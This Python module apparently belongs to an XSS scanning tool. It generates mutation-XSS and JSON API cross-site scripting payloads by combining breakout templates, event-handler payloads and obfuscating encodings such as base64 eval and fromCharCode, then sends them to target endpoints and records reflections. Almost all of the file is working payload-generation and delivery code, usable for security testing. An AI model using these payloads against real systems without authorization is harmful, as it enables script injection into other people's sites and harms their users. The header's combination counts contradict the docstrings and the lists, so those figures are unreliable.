"""
payloads/mxss_and_api.py

Combinatorial mXSS + JSON API payload engines.
Same philosophy as CombinatorialEngine — build from dimensions,
not hardcode static lists.

mXSS space:    17 containers × 4 payloads × 8 techniques × 7 encodings = 3,808
JSON API space: 6 types × 8 points × 9 payloads × 6 content-types × 8 encodings = 20,736
TOTAL:          24,544 combinations
"""

import heapq
import base64
import urllib.parse
import json as json_mod
import asyncio
import copy
from typing import List, Tuple, Optional, Iterator
from utils.config import ScanTarget, Finding, Context
from utils.http_client import HttpClient
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# mXSS DIMENSIONS
# ═══════════════════════════════════════════════════════════════

class MXSSDim:

    # Containers that cause parser confusion when closed
    CONTAINERS = [
        # (tag, score, notes)
        ("listing",    1.00, "classic mXSS vector"),
        ("noscript",   0.98, "re-parses on noScript toggle"),
        ("xmp",        0.96, "rawtext element"),
        ("textarea",   0.95, "rawtext, very common"),
        ("title",      0.94, "rawtext element"),
        ("style",      0.92, "rawtext, parsed differently"),
        ("iframe",     0.90, "srcdoc context"),
        ("plaintext",  0.88, "legacy rawtext"),
        ("noframes",   0.85, "legacy HTML"),
        ("template",   0.83, "document fragment"),
        ("math",       0.82, "MathML namespace"),
        ("svg",        0.80, "SVG namespace"),
        ("select",     0.78, "restricted content model"),
        ("option",     0.75, "restricted content model"),
        ("table",      0.73, "foster parenting"),
        ("form",       0.70, "form association quirks"),
        ("script",     0.68, "script rawtext"),
    ]

    # Exec payloads to inject after breaking out
    EXEC_PAYLOADS = [
        ("<img src=x onerror=alert(1)>",   1.00),
        ("<svg onload=alert(1)>",           0.95),
        ("<script>alert(1)</script>",       0.90),
        ("<iframe onload=alert(1)>",        0.85),
        ("<body onload=alert(1)>",          0.80),
        ("<input autofocus onfocus=alert(1)>", 0.75),
        ("<details open ontoggle=alert(1)>",   0.72),
        ("<video src=x onerror=alert(1)>",  0.70),
    ]

    # Breakout techniques
    BREAK_TECHNIQUES = [
        # (technique_label, template, score)
        # {C} = container tag, {P} = exec payload, {A} = attribute value
        ("closing_tag",
         '<{C}><img src="</{C}>{P}">',                       1.00),
        ("title_attr",
         '<{C} title="</{C}>{P}">x</{C}>',                   0.95),
        ("href_attr",
         '<{C} href="</{C}>{P}">x</{C}>',                    0.92),
        ("cdata_break",
         '<{C}><![CDATA[</{C}>{P}]]></{C}>',                 0.88),
        ("comment_break",
         '<{C}><!--</{C}>{P}--></{C}>',                      0.85),
        ("malformed_attr",
         '<{C} class="x\'></{C}>{P}<{C} y="',               0.82),
        ("ie_conditional",
         '<!--[if lt IE 9]><{C}><![endif]-->{P}',            0.75),
        ("nested_script",
         '<scr<{C}>ipt>{P}</scr</{C}>ipt>',                  0.70),
        ("namespace_confusion",
         '<svg><{C}><img src="</{C}></{C}>{P}"></svg>',      0.68),
        ("math_mtext",
         '<math><mtext><{C}><img src="</{C}>{P}">',          0.65),
        ("table_foster",
         '<table><{C}><img src="</{C}>{P}"></table>',        0.62),
        ("template_break",
         '<template><{C}></template>{P}',                     0.60),
    ]

    # Encoding transforms for the exec payload
    ENCODINGS = [
        ("none",         1.00, lambda p: p),
        ("html_entity",  0.85, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("html_hex",     0.83, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
        ("url_encode",   0.80, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",   0.75, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("unicode",      0.70, lambda p: "".join(f"\\u{ord(c):04x}" for c in p)),
        ("js_hex",       0.65, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.CONTAINERS) * len(cls.EXEC_PAYLOADS) *
                len(cls.BREAK_TECHNIQUES) * len(cls.ENCODINGS))


class MXSSEngine:
    """
    Combinatorial mXSS payload generator.
    17 × 8 × 12 × 7 = 14,112 combinations, top-N extracted via heap.
    """

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for ctag, c_score, _ in MXSSDim.CONTAINERS:
            for exec_p, ep_score in MXSSDim.EXEC_PAYLOADS:
                for tech_label, template, t_score in MXSSDim.BREAK_TECHNIQUES:
                    for enc_label, enc_score, enc_fn in MXSSDim.ENCODINGS:

                        score = (c_score * ep_score * t_score * enc_score) ** 0.25

                        try:
                            encoded_exec = enc_fn(exec_p)
                            payload = (template
                                       .replace("{C}", ctag)
                                       .replace("{P}", encoded_exec)
                                       .replace("{A}", ""))
                        except Exception:
                            continue

                        count += 1
                        label = f"mxss:{ctag}:{tech_label}:{enc_label}"

                        if len(heap) < top_n:
                            heapq.heappush(heap, (score, count, payload, label))
                        elif score > heap[0][0]:
                            heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"mXSSEngine: {count:,}/{MXSSDim.total():,} combos → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return MXSSDim.total()


# ═══════════════════════════════════════════════════════════════
# JSON API DIMENSIONS
# ═══════════════════════════════════════════════════════════════

class JSONDim:

    # Base XSS exec payloads (work in various JSON contexts)
    EXEC_PAYLOADS = [
        ("<script>alert(1)</script>",                          1.00),
        ("<img src=x onerror=alert(1)>",                       0.98),
        ("<svg onload=alert(1)>",                              0.95),
        ("javascript:alert(1)",                                0.90),
        ("\"><script>alert(1)</script>",                       0.88),
        ("'+alert(1)+'",                                       0.85),
        ('"+alert(1)+"',                                       0.85),
        ("${alert(1)}",                                        0.82),
        ("{{constructor.constructor('alert(1)')()}}",          0.80),
        ("<xss>",                                              0.75),  # canary
        ("</script><script>alert(1)</script>",                 0.72),
        ("<iframe src=javascript:alert(1)>",                   0.70),
        ("-alert(1)-",                                         0.68),
        ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", 0.65),
        ("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",        0.62),
    ]

    # Where in the JSON structure to inject
    INJECTION_POINTS = [
        # (label, wrapper_fn, score)
        ("string_value",    lambda p: p,                          1.00),
        ("json_key",        lambda p: f'{{"{p}":"value"}}',      0.90),
        ("nested_value",    lambda p: f'{{"data":{{"x":"{p}"}}}}', 0.85),
        ("array_item",      lambda p: f'["{p}"]',                 0.82),
        ("callback_jsonp",  lambda p: f'callback("{p}")',         0.80),
        ("number_break",    lambda p: f'0;{p}',                   0.75),
        ("boolean_break",   lambda p: f'true,"{p}"',              0.70),
        ("null_break",      lambda p: f'null,"{p}"',              0.68),
    ]

    # Content-Type headers to test with
    CONTENT_TYPES = [
        ("application/json",               1.00),
        ("text/plain",                     0.90),
        ("application/x-www-form-urlencoded", 0.85),
        ("application/json; charset=utf-8", 0.83),
        ("text/json",                      0.78),
        ("application/javascript",         0.70),
    ]

    # Encoding for the payload inside JSON
    ENCODINGS = [
        ("none",           1.00, lambda p: p),
        ("json_unicode",   0.90, lambda p: p.encode('unicode_escape').decode()),
        ("html_entity",    0.85, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("url_encode",     0.80, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",     0.75, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("base64_eval",    0.70, lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))"),
        ("js_hex",         0.65, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
        ("fromcharcode",   0.60, lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))"),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.EXEC_PAYLOADS) * len(cls.INJECTION_POINTS) *
                len(cls.CONTENT_TYPES) * len(cls.ENCODINGS))


class JSONAPIEngine:
    """
    Combinatorial JSON/API XSS payload generator.
    15 × 8 × 6 × 8 = 5,760 combinations.
    """

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str, str]]:
        """
        Returns (payload_str, score, content_type, label).
        """
        heap  = []
        count = 0

        for exec_p, ep_score in JSONDim.EXEC_PAYLOADS:
            for point_label, wrapper_fn, pt_score in JSONDim.INJECTION_POINTS:
                for ct, ct_score in JSONDim.CONTENT_TYPES:
                    for enc_label, enc_score, enc_fn in JSONDim.ENCODINGS:

                        score = (ep_score * pt_score * ct_score * enc_score) ** 0.25

                        try:
                            encoded  = enc_fn(exec_p)
                            payload  = wrapper_fn(encoded)
                        except Exception:
                            continue

                        count += 1
                        label = f"json:{point_label}:{enc_label}"

                        if len(heap) < top_n:
                            heapq.heappush(heap, (score, count, payload, ct, label))
                        elif score > heap[0][0]:
                            heapq.heapreplace(heap, (score, count, payload, ct, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"JSONAPIEngine: {count:,}/{JSONDim.total():,} combos → top {len(result)}")
        return [(p, s, ct, l) for s, _, p, ct, l in result]

    @property
    def total(self) -> int:
        return JSONDim.total()


# ═══════════════════════════════════════════════════════════════
# JSON API TESTER
# ═══════════════════════════════════════════════════════════════

class JSONAPITester:
    """
    Test XSS in JSON API endpoints using combinatorial payloads.
    """

    def __init__(self, http: HttpClient):
        self.http   = http
        self.engine = JSONAPIEngine()

    async def test_json_endpoint(
        self,
        url:    str,
        params: dict,
        method: str   = "POST",
        top_n:  int   = 100,
    ) -> List[Finding]:
        findings = []
        top_payloads = self.engine.generate(top_n=top_n)

        for param_key in params:
            for payload, score, content_type, label in top_payloads[:50]:
                test_data = copy.deepcopy(params)
                test_data[param_key] = payload

                try:
                    headers = {"Content-Type": content_type}
                    if method == "POST":
                        if "json" in content_type:
                            resp = await self.http.request(
                                "POST", url, json=test_data, headers=headers)
                        else:
                            resp = await self.http.request(
                                "POST", url, data=test_data, headers=headers)
                    else:
                        resp = await self.http.get(url, params=test_data)

                    if resp is None:
                        continue

                    if payload in resp.text or "<xss>" in resp.text:
                        idx = resp.text.find(payload) if payload in resp.text \
                              else resp.text.find("<xss>")
                        evidence = resp.text[max(0,idx-80):idx+len(payload)+80]
                        findings.append(Finding(
                            url=url, param=f"json:{param_key}",
                            payload=payload, context=Context.JS_STRING,
                            xss_type="reflected", evidence=evidence[:300],
                            severity="High", confidence="Medium",
                            encoding_used=label,
                        ))
                        break

                    # Check JSON response body
                    try:
                        resp_json  = json_mod.loads(resp.text)
                        resp_str   = json_mod.dumps(resp_json)
                        if payload in resp_str:
                            findings.append(Finding(
                                url=url, param=f"json:{param_key}",
                                payload=payload, context=Context.JS_STRING,
                                xss_type="stored", evidence=resp_str[:300],
                                severity="Medium", confidence="Low",
                                encoding_used=f"json_body:{label}",
                            ))
                            break
                    except Exception:
                        pass

                except Exception as e:
                    debug(f"JSON test error {url}: {e}")

        return findings
